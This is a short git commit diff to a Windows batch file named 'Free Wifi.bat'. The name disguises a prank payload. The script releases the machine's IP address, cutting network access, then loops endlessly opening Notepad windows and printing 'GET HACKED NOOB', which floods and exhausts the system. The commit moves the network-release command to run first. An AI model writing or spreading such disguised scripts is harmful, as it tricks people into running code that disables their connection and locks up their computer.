11572ca919acec56c3dcc8edea08b3a164f4887b
NotTimIsReal <alastairrintumathew@gmail.com>
2021-06-08 13:58:59 +1000

    Fixed Up

--- BATS/Free Wifi.bat
+++ BATS/Free Wifi.bat
@@ -1,8 +1,7 @@
 @ECHO off
-
+Ipconfig/release
  :top
  START %SystemRoot%\system32\notepad.exe
  echo GET HACKED NOOB
  echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
-ipconfig/release
  GOTO top
